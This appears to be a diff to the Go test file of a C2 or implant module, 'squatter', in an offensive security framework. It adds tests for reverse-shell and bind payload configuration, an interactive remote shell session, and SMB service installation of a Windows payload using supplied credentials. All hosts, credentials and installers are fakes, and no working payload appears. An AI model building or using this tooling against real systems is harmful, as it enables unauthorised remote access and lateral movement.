@@ -10,6 +10,7 @@ import (
 	"strings"
 	"testing"
 	"time"
+	"unicode/utf16"
 
 	"github.com/Vibe-Pwners/hovel/sdk/go/hovel"
 	"github.com/Vibe-Pwners/hovel/sdk/go/hoveltest"
@@ -69,14 +70,11 @@ func TestProviderReportsStepContracts(t *testing.T) {
 	if connect.Kind != "session.connector" {
 		t.Fatalf("connect_smb kind = %q", connect.Kind)
 	}
-	if len(connect.Requires) != 3 {
+	if len(connect.Requires) != 2 {
 		t.Fatalf("connect_smb requires = %#v", connect.Requires)
 	}
 	if connect.Requires[0].Type != hovel.CapabilityPayloadInstance || connect.Requires[0].Attributes["transport"] != smbNamedPipe {
 		t.Fatalf("payload instance requirement = %#v", connect.Requires[0])
-	}
-	if connect.Requires[2].Type != hovel.CapabilityCredential || connect.Requires[2].Attributes["protocol"] != "smb" {
-		t.Fatalf("credential requirement = %#v", connect.Requires[2])
 	}
 	if len(connect.Produces) != 1 || connect.Produces[0].Type != hovel.CapabilitySessionRef {
 		t.Fatalf("connect_smb produces = %#v", connect.Produces)
@@ -149,6 +147,42 @@ func TestProviderPreparePreservesExistingPreparedValues(t *testing.T) {
 	}
 }
 
+func TestProviderPrepareSMBInstallUsesConfiguredPipe(t *testing.T) {
+	prepared, err := newProvider().PrepareStep(hovel.StepPrepareRequest{
+		StepID: "squatter.install_smb",
+		Config: map[string]any{
+			"payload.pipe": `\\.\pipe\squatter`,
+		},
+	})
+	if err != nil {
+		t.Fatal(err)
+	}
+	if got := prepared.PreparedValues["pipe_name"].Value; got != "squatter" {
+		t.Fatalf("pipe_name = %#v, want squatter", got)
+	}
+	if got := prepared.PlannedOutputs[1].Attributes["pipe_name"]; got != "squatter" {
+		t.Fatalf("transport pipe_name = %#v, want squatter", got)
+	}
+}
+
+func TestProviderPrepareSMBInstallUsesConfiguredRemotePath(t *testing.T) {
+	prepared, err := newProvider().PrepareStep(hovel.StepPrepareRequest{
+		StepID: "squatter.install_smb",
+		Config: map[string]any{
+			"payload.remote_path": `C:\Windows\System32\hovel.exe`,
+		},
+	})
+	if err != nil {
+		t.Fatal(err)
+	}
+	if got := prepared.PreparedValues["staged_path"].Value; got != `C:\Windows\System32\hovel.exe` {
+		t.Fatalf("staged_path = %#v", got)
+	}
+	if got := prepared.PlannedOutputs[0].Attributes["staged_path"]; got != `C:\Windows\System32\hovel.exe` {
+		t.Fatalf("planned staged_path = %#v", got)
+	}
+}
+
 func TestProviderGeneratesWindowsPEArtifactSet(t *testing.T) {
 	generated, err := newProvider().GeneratePayload(hovel.GeneratePayloadRequest{
 		Target:    "target-1",
@@ -175,10 +209,7 @@ func TestProviderGeneratesWindowsPEArtifactSet(t *testing.T) {
 		t.Fatalf("artifact count = %d", len(generated.Artifacts))
 	}
 
-	configOffset := bytes.Index(body, []byte("SQCFG001"))
-	if configOffset < 0 {
-		t.Fatal("generated payload is missing config marker")
-	}
+	configOffset := mustPayloadConfigOffset(t, body)
 	if got := binary.LittleEndian.Uint32(body[configOffset+payloadConfigKindOffset:]); got != payloadConfigKindReverseTCP {
 		t.Fatalf("transport kind = %d", got)
 	}
@@ -205,10 +236,7 @@ func TestProviderPatchesPayloadConfigFromListener(t *testing.T) {
 	if err != nil {
 		t.Fatal(err)
 	}
-	configOffset := bytes.Index(body, []byte("SQCFG001"))
-	if configOffset < 0 {
-		t.Fatal("generated payload is missing config marker")
-	}
+	configOffset := mustPayloadConfigOffset(t, body)
 	if got := binary.LittleEndian.Uint16(body[configOffset+payloadConfigPortOffset:]); got != 31337 {
 		t.Fatalf("reverse port = %d", got)
 	}
@@ -228,10 +256,7 @@ func TestProviderPatchesTCPBindPayloadConfig(t *testing.T) {
 	if err != nil {
 		t.Fatal(err)
 	}
-	configOffset := bytes.Index(body, []byte("SQCFG001"))
-	if configOffset < 0 {
-		t.Fatal("generated payload is missing config marker")
-	}
+	configOffset := mustPayloadConfigOffset(t, body)
 	if got := binary.LittleEndian.Uint32(body[configOffset+payloadConfigKindOffset:]); got != payloadConfigKindTCPBind {
 		t.Fatalf("transport kind = %d", got)
 	}
@@ -254,15 +279,29 @@ func TestProviderPatchesSMBNamedPipePayloadConfig(t *testing.T) {
 	if err != nil {
 		t.Fatal(err)
 	}
-	configOffset := bytes.Index(body, []byte("SQCFG001"))
-	if configOffset < 0 {
-		t.Fatal("generated payload is missing config marker")
-	}
+	configOffset := mustPayloadConfigOffset(t, body)
 	if got := binary.LittleEndian.Uint32(body[configOffset+payloadConfigKindOffset:]); got != payloadConfigKindSMBPipe {
 		t.Fatalf("transport kind = %d", got)
 	}
 	if !bytes.Contains(body[configOffset:], []byte{'h', 0, 'o', 0, 'v', 0, 'e', 0, 'l', 0}) {
 		t.Fatal("patched payload does not contain UTF-16LE pipe name")
+	}
+}
+
+func TestPayloadConfigOffsetSkipsNonConfigMarker(t *testing.T) {
+	body := make([]byte, 512)
+	copy(body, []byte("SQCFG001-not-the-runtime-config"))
+	configOffset := 128
+	copy(body[configOffset:], []byte(payloadConfigMagic))
+	binary.LittleEndian.PutUint32(body[configOffset+payloadConfigKindOffset:], payloadConfigKindSMBPipe)
+	writeUTF16At(body, configOffset+payloadConfigPipeOffset, `\\.\pipe\squatter`)
+
+	offset, err := payloadConfigOffset(body)
+	if err != nil {
+		t.Fatal(err)
+	}
+	if offset != configOffset {
+		t.Fatalf("config offset = %d, want %d", offset, configOffset)
 	}
 }
 
@@ -444,6 +483,63 @@ func TestPlaceholderLPSMBConnectsProviderOwnedSession(t *testing.T) {
 	}
 }
 
+func TestProviderRunOpensPrettyPTYSessionOverJSONRPC(t *testing.T) {
+	clientConn, serverConn := net.Pipe()
+	defer serverConn.Close()
+
+	lp := newPlaceholderLP()
+	lp.smb = &fakeSMBConnector{conn: clientConn}
+	rpc := hoveltest.NewRPCConn(t, Provider{lp: lp})
+	defer rpc.Close()
+
+	var result struct {
+		Status   string             `json:"status"`
+		Sessions []hovel.SessionRef `json:"sessions"`
+	}
+	rpc.Call("execute", map[string]any{
+		"runId":    "run-1",
+		"moduleId": "squatter",
+		"target":   "target-1",
+		"chainConfig": map[string]any{
+			"payload.transport": smbNamedPipe,
+			"payload.pipe":      "pipe123",
+			"smb.username":      "user123",
+			"smb.password":      "pass123",
+		},
+		"targetConfig": map[string]any{
+			"target.host": "target-1",
+		},
+	}, &result)
+	if result.Status != "succeeded" || len(result.Sessions) != 1 {
+		t.Fatalf("execute result = %#v", result)
+	}
+	sessionID := result.Sessions[0].ID
+	banner := readRPCSessionUntil(t, rpc, sessionID, "sq>", 2*time.Second)
+	if !strings.Contains(banner, "squatterctl") || !strings.Contains(banner, "tab completes commands") {
+		t.Fatalf("session banner = %q, want pretty squatterctl banner and prompt", banner)
+	}
+
+	writeRPCSession(t, rpc, sessionID, "help\n")
+	help := readRPCSessionUntil(t, rpc, sessionID, "putfile", 2*time.Second)
+	if !strings.Contains(help, "commands") || !strings.Contains(help, "putfile") {
+		t.Fatalf("help output = %q, want squatterctl help", help)
+	}
+
+	writeRPCSession(t, rpc, sessionID, "\t")
+	completion := readRPCSessionUntil(t, rpc, sessionID, "open cmd.exe", 2*time.Second)
+	if !strings.Contains(completion, "cmd") || !strings.Contains(completion, "echo") {
+		t.Fatalf("completion output = %q, want squatterctl suggestions", completion)
+	}
+
+	var closeResult struct {
+		Status string `json:"status"`
+	}
+	rpc.Call("session/close", map[string]any{"sessionId": sessionID, "reason": "test"}, &closeResult)
+	if closeResult.Status != "ok" {
+		t.Fatalf("close result = %#v", closeResult)
+	}
+}
+
 func TestProviderExecuteConnectTCPBindProducesSessionCapability(t *testing.T) {
 	listener, err := net.Listen("tcp", "127.0.0.1:0")
 	if err != nil {
@@ -585,6 +681,118 @@ func TestProviderExecuteConnectSMBProducesSessionCapability(t *testing.T) {
 	}
 }
 
+func TestProviderExecuteInstallSMBUploadsAndStartsWithCredentials(t *testing.T) {
+	installer := &fakeSMBInstaller{result: smbInstallResult{
+		RemotePath:    `C:\Windows\Temp\agent.exe`,
+		ServiceName:   "svc123",
+		BinaryPath:    `"C:\Windows\Temp\agent.exe"`,
+		BytesWritten:  1234,
+		ServiceStatus: 0,
+	}}
+	provider := Provider{lp: newPlaceholderLP(), smbInstaller: installer}
+
+	result, err := provider.ExecuteStep(hovel.StepExecuteRequest{
+		RunID:  "run-1",
+		StepID: "squatter.install_smb",
+		ConfirmedPreparedValues: map[string]any{
+			"staged_path":  `C:\Windows\Temp\agent.exe`,
+			"service_name": "svc123",
+			"pipe_name":    "pipe123",
+		},
+		RunMetadata: map[string]any{
+			"config": map[string]any{
+				"target.host":  "192.0.2.20",
+				"smb.username": "user123",
+				"smb.password": "pass123",
+				"smb.domain":   "LAB",
+			},
+		},
+	})
+	if err != nil {
+		t.Fatal(err)
+	}
+	if result.Status != "succeeded" {
+		t.Fatalf("result = %#v", result)
+	}
+	if len(installer.requests) != 1 {
+		t.Fatalf("installer requests = %#v, want one", installer.requests)
+	}
+	request := installer.requests[0]
+	if request.Host != "192.0.2.20" || request.Username != "user123" || request.Password != "pass123" || request.Domain != "LAB" {
+		t.Fatalf("install request = %#v", request)
+	}
+	if request.RemotePath != `C:\Windows\Temp\agent.exe` || request.ServiceName != "svc123" || request.PipeName != "pipe123" {
+		t.Fatalf("install target values = %#v", request)
+	}
+	if len(request.Payload) == 0 || !bytes.HasPrefix(request.Payload, []byte("MZ")) {
+		t.Fatalf("payload bytes = %d, prefix % x", len(request.Payload), request.Payload[:min(len(request.Payload), 2)])
+	}
+	configOffset := mustPayloadConfigOffset(t, request.Payload)
+	if got := binary.LittleEndian.Uint32(request.Payload[configOffset+payloadConfigKindOffset:]); got != payloadConfigKindSMBPipe {
+		t.Fatalf("payload transport kind = %d", got)
+	}
+	if !bytes.Contains(request.Payload[configOffset:], []byte{'p', 0, 'i', 0, 'p', 0, 'e', 0, '1', 0, '2', 0, '3', 0}) {
+		t.Fatal("payload uploaded by installer does not contain UTF-16LE pipe123")
+	}
+	if len(result.Capabilities) != 3 {
+		t.Fatalf("capabilities = %#v", result.Capabilities)
+	}
+	if result.Capabilities[0].State != "installed" || result.Capabilities[1].State != "active" {
+		t.Fatalf("capability states = %#v", result.Capabilities)
+	}
+}
+
+func mustPayloadConfigOffset(t *testing.T, body []byte) int {
+	t.Helper()
+	offset, err := payloadConfigOffset(body)
+	if err != nil {
+		t.Fatal(err)
+	}
+	return offset
+}
+
+func writeUTF16At(body []byte, offset int, value string) {
+	for index, code := range utf16.Encode([]rune(value)) {
+		binary.LittleEndian.PutUint16(body[offset+(index*2):], code)
+	}
+}
+
+func writeRPCSession(t *testing.T, conn *hoveltest.RPCConn, sessionID string, data string) {
+	t.Helper()
+	var result struct {
+		Status string `json:"status"`
+	}
+	conn.Call("session/write", map[string]any{
+		"sessionId": sessionID,
+		"data":      base64.StdEncoding.EncodeToString([]byte(data)),
+	}, &result)
+	if result.Status != "ok" {
+		t.Fatalf("session/write result = %#v", result)
+	}
+}
+
+func readRPCSessionUntil(t *testing.T, conn *hoveltest.RPCConn, sessionID string, needle string, timeout time.Duration) string {
+	t.Helper()
+	deadline := time.Now().Add(timeout)
+	var out strings.Builder
+	for time.Now().Before(deadline) {
+		var chunk struct {
+			Data string `json:"data"`
+		}
+		conn.Call("session/read", map[string]any{"sessionId": sessionID, "timeoutMs": 100}, &chunk)
+		decoded, err := base64.StdEncoding.DecodeString(chunk.Data)
+		if err != nil {
+			t.Fatal(err)
+		}
+		out.Write(decoded)
+		if strings.Contains(out.String(), needle) {
+			return out.String()
+		}
+	}
+	t.Fatalf("timed out waiting for %q in %q", needle, out.String())
+	return ""
+}
+
 type fakeSMBConnector struct {
 	requests []smbConnectOptions
 	conn     io.ReadWriteCloser
@@ -604,3 +812,17 @@ type noopReadWriteCloser struct{}
 func (noopReadWriteCloser) Read([]byte) (int, error)    { return 0, io.EOF }
 func (noopReadWriteCloser) Write(p []byte) (int, error) { return len(p), nil }
 func (noopReadWriteCloser) Close() error                { return nil }
+
+type fakeSMBInstaller struct {
+	requests []smbInstallOptions
+	result   smbInstallResult
+	err      error
+}
+
+func (i *fakeSMBInstaller) InstallSMB(_ hovel.StepExecuteRequest, opts smbInstallOptions) (smbInstallResult, error) {
+	i.requests = append(i.requests, opts)
+	if i.err != nil {
+		return smbInstallResult{}, i.err
+	}
+	return i.result, nil
+}
